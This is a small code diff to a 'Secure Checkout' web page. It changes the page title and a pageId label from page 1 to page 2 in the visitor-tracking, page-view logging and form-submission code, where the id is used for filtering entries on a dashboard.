@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Checkout - Page 1</title>
+    <title>Secure Checkout - Page 2</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
@@ -270,7 +270,7 @@ async function trackVisitor() {
             await addDoc(
                 collection(db, "visitors"),
                 {
-                    pageId: "page1", // Added for Page 1 identification
+                    pageId: "page2", // Page 2 identification
                     date: today,
                     createdAt: serverTimestamp()
                 }
@@ -286,7 +286,7 @@ async function trackVisitor() {
         await addDoc(
             collection(db, "pageViews"),
             {
-                pageId: "page1", // Added for Page 1 identification
+                pageId: "page2", // Page 2 identification
                 page: "information",
                 date: today,
                 createdAt: serverTimestamp()
@@ -359,7 +359,7 @@ form.addEventListener("submit", async (e) => {
 
     const data = {
 
-        pageId: "page1", // 👈 Added pageId for Page 1 identification
+        pageId: "page2", // 👈 Page 2 identification for dashboard filtering
 
         phoneNumber: phoneNumber,
 
